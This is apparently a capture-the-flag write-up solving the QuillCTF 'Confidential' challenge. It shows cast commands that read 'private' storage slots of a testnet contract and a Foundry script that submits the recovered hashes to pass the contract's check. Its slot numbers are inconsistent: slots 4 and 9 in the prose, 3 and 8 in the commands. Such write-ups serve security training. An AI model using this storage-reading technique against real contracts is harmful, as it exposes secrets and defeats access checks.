## Confidential
by Team QuillAudits
https://quillctf.super.site/challenges/quillctf-challenges/ctf02

solution by 2pats

### Main Vulnerabilities:
"private" storage in EMV smart contracts are not actually private;

### Strategy:
Access the private variables using foundry toolkit's cast CLI utility

### Walkthrough
1) the given instance address is 0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66

2) the two keys we need are the stored values "aliceHash" and "bobHash" bytes32 at storage slots 4 and 9 respectively
*note: conveniently, each value stored in this contract takes up exactly 1 slot, the types are string,uint,bytes32. Each slot is signed at bytes32

3) use the foundry cast CLI read these slots:

we are on goerli, so I use this as the environment variable GOERLI_RPC=https://rpc.ankr.com/eth_goerli
```
cast storage 0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66 3 --rpc-url $GOERLI_RPC
cast storage 0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66 8 --rpc-url $GOERLI_RPC
```

the outputs will be in your terminal, copy and paste to use in the following foundry script:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";
import "../src/Confidential.sol";

contract Hack {
    //address given by the CTF prompt
    address targetAddress = 0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66;
    Confidential target = Confidential(targetAddress);

    // alice hash at storage slot 4
    bytes32 A = 0x448e5df1a6908f8d17fae934d9ae3f0c63545235f8ff393c6777194cae281478;
    //bob hash at stirage slot 9
    bytes32 B = 0x98290e06bee00d6b6f34095a54c4087297e3285d457b140128c1c2f3b62a41bd;

    //solver
    function run() public view {
        //use the hash function given by the CTF contract
        bytes32 hash = target.hash(A, B);

        //check of that hash is valid
        bool result = target.checkthehash(hash);

        //if true, we pass
        console.logBool(result);
    }
}

``` 

the CTF contract provides the hash functions for us, just use A and B as the inputs that we have derived from earlier

